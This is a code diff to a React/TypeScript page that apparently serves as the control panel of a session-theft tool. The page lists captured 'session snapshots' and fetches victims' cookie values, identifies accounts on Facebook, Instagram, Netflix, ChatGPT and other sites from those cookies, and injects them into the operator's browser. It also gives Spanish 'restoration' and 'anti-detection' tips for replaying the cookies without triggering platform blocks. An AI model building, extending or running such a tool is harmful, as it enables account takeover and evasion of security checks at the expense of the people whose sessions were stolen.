@@ -62,12 +62,12 @@ export default function SessionsPage() {
   const getPrimaryDomainFromCookies = (sessionCookies: Cookie[]): string => {
     if (sessionCookies.length === 0) return "unknown.com";
     
-    // Prioritize domains with known suffixes or those that appear most frequently
     const domainCounts: Record<string, number> = {};
     sessionCookies.forEach(c => {
-      const d = c.domain.startsWith('.') ? c.domain.substring(1) : c.domain;
-      // Filter out common ad/tracker domains to find the "real" site
-      if (!d.includes("fwmrm.net") && !d.includes("doubleclick") && !d.includes("analytics")) {
+      // Clean domain: Remove leading dot and convert to lowercase
+      const d = c.domain.replace(/^\./, "").toLowerCase();
+      // Ignore common noise domains
+      if (!d.includes("fwmrm.net") && !d.includes("doubleclick") && !d.includes("analytics") && !d.includes("facebook-pixel") && !d.includes("googletagmanager")) {
         domainCounts[d] = (domainCounts[d] || 0) + 1;
       }
     });
@@ -75,7 +75,7 @@ export default function SessionsPage() {
     const entries = Object.entries(domainCounts);
     if (entries.length === 0) return sessionCookies[0].domain.replace(/^\./, "");
     
-    // Return the domain with the highest count (most cookies)
+    // Sort by frequency and return the top domain
     return entries.sort((a, b) => b[1] - a[1])[0][0];
   };
 
@@ -84,63 +84,65 @@ export default function SessionsPage() {
     const domainStr = sessionCookies.map(c => c.domain.toLowerCase()).join(" ");
     const primaryDomain = getPrimaryDomainFromCookies(sessionCookies);
     
-    // Platform mapping
+    // Platform detection logic
     if (domainStr.includes("facebook.com")) {
       const fbId = sessionCookies.find(c => c.name === "c_user")?.value;
-      return { platform: "Facebook", identifier: fbId || "Account", icon: Facebook, color: "text-blue-500", health, domain: "facebook.com" };
+      return { platform: "Facebook", identifier: fbId || "Facebook User", icon: Facebook, color: "text-blue-500", health, domain: "facebook.com" };
     }
     if (domainStr.includes("instagram.com")) {
       const igId = sessionCookies.find(c => c.name === "ds_user_id")?.value;
-      return { platform: "Instagram", identifier: igId || "Account", icon: Instagram, color: "text-pink-500", health, domain: "instagram.com" };
+      return { platform: "Instagram", identifier: igId || "Instagram Account", icon: Instagram, color: "text-pink-500", health, domain: "instagram.com" };
     }
     if (domainStr.includes("youtube.com") || domainStr.includes("google.com/youtube")) {
-      return { platform: "YouTube", identifier: "Viewer", icon: Youtube, color: "text-red-500", health, domain: "youtube.com" };
+      return { platform: "YouTube", identifier: "YouTube Viewer", icon: Youtube, color: "text-red-500", health, domain: "youtube.com" };
     }
     if (domainStr.includes("grok.com") || domainStr.includes("x.com/i/grok")) {
-      return { platform: "Grok AI", identifier: "Agent", icon: Bot, color: "text-purple-400", health, domain: "grok.com" };
+      return { platform: "Grok AI", identifier: "AI Brain", icon: Bot, color: "text-purple-400", health, domain: "grok.com" };
     }
     if (domainStr.includes("linkedin.com")) {
-      return { platform: "LinkedIn", identifier: "Professional", icon: Linkedin, color: "text-blue-600", health, domain: "linkedin.com" };
+      return { platform: "LinkedIn", identifier: "Professional Profile", icon: Linkedin, color: "text-blue-600", health, domain: "linkedin.com" };
     }
     if (domainStr.includes("mercadolibre.com")) {
-      return { platform: "Mercado Libre", identifier: "Buyer", icon: ShoppingCart, color: "text-yellow-400", health, domain: "mercadolibre.com" };
+      return { platform: "Mercado Libre", identifier: "Account", icon: ShoppingCart, color: "text-yellow-400", health, domain: "mercadolibre.com" };
     }
     if (domainStr.includes("gemini.google.com")) {
-      return { platform: "Gemini", identifier: "AI Model", icon: MessageSquare, color: "text-blue-300", health, domain: "gemini.google.com" };
+      return { platform: "Gemini", identifier: "LLM Session", icon: MessageSquare, color: "text-blue-300", health, domain: "gemini.google.com" };
     }
     if (domainStr.includes("openai.com") || domainStr.includes("chatgpt.com")) 
       return { platform: "ChatGPT", identifier: "AI Assistant", icon: Cpu, color: "text-emerald-400", health, domain: "chatgpt.com" };
     if (domainStr.includes("kick.com"))
-      return { platform: "Kick", identifier: "Streamer", icon: Gamepad2, color: "text-green-500", health, domain: "kick.com" };
+      return { platform: "Kick", identifier: "Stream Session", icon: Gamepad2, color: "text-green-500", health, domain: "kick.com" };
     if (domainStr.includes("x.com") || domainStr.includes("twitter.com"))
-      return { platform: "X / Twitter", identifier: "Social", icon: Twitter, color: "text-blue-400", health, domain: "x.com" };
+      return { platform: "X / Twitter", identifier: "Social ID", icon: Twitter, color: "text-blue-400", health, domain: "x.com" };
     if (domainStr.includes("netflix.com"))
-      return { platform: "Netflix", identifier: "Viewer", icon: Play, color: "text-red-600", health, domain: "netflix.com" };
+      return { platform: "Netflix", identifier: "Streaming User", icon: Play, color: "text-red-600", health, domain: "netflix.com" };
     if (domainStr.includes("up.edu.pe") || domainStr.includes("blackboard.com"))
-      return { platform: "Blackboard", identifier: "Student", icon: GraduationCap, color: "text-blue-400", health, domain: "blackboard.com" };
+      return { platform: "Blackboard", identifier: "Academic Portal", icon: GraduationCap, color: "text-blue-400", health, domain: "blackboard.com" };
     if (domainStr.includes("google.com"))
-      return { platform: "Google", identifier: "User", icon: Globe, color: "text-red-400", health, domain: "google.com" };
+      return { platform: "Google", identifier: "Authenticated User", icon: Globe, color: "text-red-400", health, domain: "google.com" };
 
-    // Generic fallback based on primary domain found in cookies
-    const capitalized = primaryDomain.charAt(0).toUpperCase() + primaryDomain.split('.')[0].slice(1);
-    return { platform: capitalized, identifier: "Session", icon: Shield, color: "text-amber-400", health, domain: primaryDomain };
+    // Generic labeling for unknown platforms
+    const capitalizedName = primaryDomain.split('.')[0].charAt(0).toUpperCase() + primaryDomain.split('.')[0].slice(1);
+    return { platform: capitalizedName || "External", identifier: fallbackId || "Active Session", icon: Shield, color: "text-amber-400", health, domain: primaryDomain };
   };
 
   const fetchSessions = async () => {
+    setLoading(true);
     const { data: sessionData } = await supabase
       .from("session_snapshots")
       .select("*")
       .order("captured_at", { ascending: false })
-      .limit(100);
+      .limit(80); // Lowering limit slightly to stay within batch cookie fetch safely
     
     if (sessionData) {
       const sessionIds = sessionData.map(s => s.id);
       
-      // Fetch identifying cookies for ALL sessions in one batch to identify platforms
+      // CRITICAL: Fetching more cookies to ensure we have domain data for identification
       const { data: identifyingCookies } = await supabase
         .from("cookies")
-        .select("*")
-        .in("snapshot_id", sessionIds);
+        .select("snapshot_id, domain, name, value, expiration_date")
+        .in("snapshot_id", sessionIds)
+        .limit(10000); // Massive limit to cover all session metadata
       
       const newAccountMap: Record<string, AccountInfo> = {};
       sessionData.forEach(session => {
@@ -159,7 +161,7 @@ export default function SessionsPage() {
       .from("cookies")
       .select("*")
       .eq("snapshot_id", snapshotId)
-      .limit(2000);
+      .limit(3000); // Full fetch for restoration
     if (data) setCookies(data);
     setLoadingCookies(false);
   };
@@ -183,7 +185,6 @@ export default function SessionsPage() {
     const domain = location.hostname;
     document.cookie = name + "=; expires=Thu, 01 Jan 1970 00:00:00 UTC; path=/;"; 
     document.cookie = name + "=; expires=Thu, 01 Jan 1970 00:00:00 UTC; path=/; domain=" + domain;
-    document.cookie = name + "=; expires=Thu, 01 Jan 1970 00:00:00 UTC; path=/; domain=." + domain;
   });
 
   cookies.forEach(c => {
@@ -268,7 +269,7 @@ export default function SessionsPage() {
                 onChange={(e) => setSearchTerm(e.target.value)}
               />
             </div>
-            <button onClick={() => {setLoading(true); fetchSessions();}} className="glass p-2.5 rounded-xl hover:bg-white/5 transition-colors">
+            <button onClick={() => {fetchSessions();}} className="glass p-2.5 rounded-xl hover:bg-white/5 transition-colors">
               <RefreshCw size={20} className={loading ? "animate-spin text-blue-400" : "text-gray-400"} />
             </button>
             <button onClick={() => setShowGuide(!showGuide)} className="glass flex items-center gap-2 px-4 py-2 rounded-xl text-blue-400 border border-blue-500/20 font-bold text-sm">
@@ -284,7 +285,7 @@ export default function SessionsPage() {
         ) : (
           <div className="grid grid-cols-1 md:grid-cols-3 lg:grid-cols-4 gap-6">
             {filteredSessions.map((session) => {
-              const info = accountMap[session.id] || { platform: "Unknown", identifier: "Anonymous", icon: Shield, color: "text-gray-400", health: "active", domain: "unknown" };
+              const info = accountMap[session.id] || { platform: "External", identifier: "Active Session", icon: Shield, color: "text-gray-400", health: "active", domain: "unknown" };
               const UAIcon = getDeviceIcon(session.user_agent);
               
               return (
@@ -313,12 +314,12 @@ export default function SessionsPage() {
                     </div>
                   </div>
                   <div>
-                    <div className="text-[10px] font-bold text-blue-400/80 uppercase tracking-widest mb-1 px-1">
+                    <div className="text-[10px] font-black text-blue-400/80 uppercase tracking-widest mb-1 px-1 drop-shadow-sm">
                       {info.domain}
                     </div>
                     <h4 className="font-extrabold text-lg truncate text-white/90 mb-1">{info.identifier}</h4>
                     <div className="flex items-center justify-between mt-3">
-                      <div className="flex items-center gap-1.5 text-[10px] font-bold text-gray-500">
+                      <div className="flex items-center gap-1.5 text-[10px] font-bold text-gray-400">
                         <Clock size={12} />
                         {formatRelativeTime(session.captured_at)}
                       </div>
@@ -343,7 +344,7 @@ export default function SessionsPage() {
               exit={{ opacity: 0, x: 300 }} 
               className="fixed top-24 right-8 w-80 z-40"
             >
-              <GlassCard className="p-6 border-l-4 border-blue-500 bg-black/80 backdrop-blur-2xl">
+              <GlassCard className="p-6 border-l-4 border-blue-500 bg-black/80 backdrop-blur-2xl px-8">
                 <div className="flex items-center justify-between mb-6">
                   <h5 className="font-black text-sm uppercase tracking-widest text-blue-400">Guía de Restauración</h5>
                   <button onClick={() => setShowGuide(false)} className="p-1 hover:bg-white/5 rounded-lg"><X size={16} /></button>
@@ -382,7 +383,7 @@ export default function SessionsPage() {
                         </div>
                         <div>
                           <h3 className="text-4xl font-black text-white/90">{accountMap[selectedSession.id]?.platform}</h3>
-                          <div className="flex items-center gap-2 text-gray-500 font-bold mt-1 uppercase text-xs tracking-widest">
+                          <div className="flex items-center gap-2 text-gray-400 font-bold mt-1 uppercase text-xs tracking-widest">
                             <Clock size={14} /> CAPTURA: {new Date(selectedSession.captured_at).toLocaleString()} | {accountMap[selectedSession.id]?.domain}
                           </div>
                         </div>
@@ -393,14 +394,14 @@ export default function SessionsPage() {
                           <Monitor size={16} /> USER-AGENT REQUERIDO
                         </div>
                         {selectedSession.user_agent ? (
-                          <div className="text-xs font-mono text-gray-400 break-all leading-relaxed bg-black/40 p-4 rounded-2xl border border-white/5">
+                          <div className="text-xs font-mono text-gray-400 break-all leading-relaxed bg-black/40 p-4 rounded-2xl border border-white/5 shadow-inner">
                             {selectedSession.user_agent}
                           </div>
                         ) : (
                           <div className="flex flex-col items-center justify-center gap-2 p-6 bg-red-500/5 rounded-2xl border border-red-500/10 text-center">
                             <AlertCircle size={24} className="text-red-400/50" />
                             <p className="text-xs text-gray-400 font-medium max-w-[200px]">
-                              Sesión sin firma UA guardada. Se recomienda usar Chrome en Windows por defecto.
+                              Sesión sin firma UA. Se recomienda usar Chrome/Win por defecto.
                             </p>
                           </div>
                         )}
@@ -442,7 +443,7 @@ export default function SessionsPage() {
                       <div className="p-5 rounded-[1.5rem] bg-amber-500/5 border border-amber-500/10 flex gap-4">
                          <div className="p-3 rounded-xl bg-amber-500/10 h-fit text-amber-400"><Info size={20} /></div>
                          <p className="text-[12px] text-amber-200/60 leading-relaxed font-medium">
-                           <b>ANTI-DETECCIÓN:</b> Usa el botón **JSON** e impórtalo con **Cookie-Editor**. La consola no puede inyectar cookies "HttpOnly" y el login fallará en sitios protegidos.
+                           <b>ANTI-DETECCIÓN:</b> Usa el botón **JSON** e impórtalo con **Cookie-Editor**. La consola no puede inyectar todas las cookies y Instagram te bloqueará si falta la sesión segura.
                          </p>
                       </div>
                     </div>
